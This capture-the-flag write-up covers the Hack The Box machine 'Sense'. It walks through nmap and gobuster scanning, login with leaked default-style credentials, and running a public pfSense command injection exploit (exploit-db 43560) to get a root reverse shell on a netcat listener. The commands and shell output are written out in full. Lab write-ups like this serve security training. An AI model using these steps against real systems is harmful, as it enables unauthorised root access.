# HTB - Sense
## OS - FreeBSD

As usual I started with an nmap scan of the box (IP address of Sense is 10.10.10.60).

```
$nmap -sC -sV -sT -oN Sense.nmap 10.10.10.60
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-18 13:30 PST
Nmap scan report for 10.10.10.60
Host is up (0.097s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.99 seconds
```

Visiting http://10.10.10.60 gets redirected automatically to https://10.10.10.60 that shows a login page. The default credentials for pfsense are admin/pfsense but that did not work.

Doing some directory bruteforcing using gobuster.

```
$gobuster dir -k -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .txt,.php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2021/01/18 13:45:09 Starting gobuster
===============================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
[ERROR] 2021/01/18 13:51:33 [!] Get https://10.10.10.60/cdsa: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
===============================================================
2021/01/18 14:09:29 Finished

```
**It found several interesting files.**

For example, https://10.10.10.60/changelog.txt shows 
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

So chances are there is a public exploit that is not patched. Will explore that later.

https://10.10.10.60/tree/ shows a silverstripe tree control v 0.1 being running. Internet search showed that it is a CMS tool with some exploits available.

/system-users.txt shows the following:

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

Logging in as rohit/pfsense worked.

The mainpage after logging in shows that pfsense version 2.1.3 is running. Searching for exploits gives us https://www.exploit-db.com/exploits/43560 (pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection) as the top result.   Trying that first, as command injection is what we want.

Downloaded the exploit and ran it, while running a nc listener on port 4321.

```
$python3 43560.py -h
usage: 43560.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT]
                [--username USERNAME] [--password PASSWORD]

optional arguments:
  -h, --help           show this help message and exit
  --rhost RHOST        Remote Host
  --lhost LHOST        Local Host listener
  --lport LPORT        Local Port listener
  --username USERNAME  pfsense Username
  --password PASSWORD  pfsense Password

$python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.16 --lport 4321 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed

```

On my nc listener,


```
$nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.60] 11637
sh: can't access tty; job control turned off
# ls
GW_WAN-quality.rrd
WAN_DHCP-quality.rrd
ipsec-packets.rrd
ipsec-traffic.rrd
system-mbuf.rrd
system-memory.rrd
system-processor.rrd
system-states.rrd
updaterrd.sh
wan-packets.rrd
wan-traffic.rrd
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# ls /root          
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
# cat /root/root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx86
# cd /home
# ls
.snap
rohit
# cd rohit
# ls
.tcshrc
user.txt
# cat user.txt
```

On the whole, it was a simple machine with a public exploit that worked without any modifications. Was very straightforward. The directory bruteforcing was interesting though. The Silverstripe tree control software can also be used for exploitation, probably, but since the box was named Sense and the software was pfsense, the focus was on pfsense.









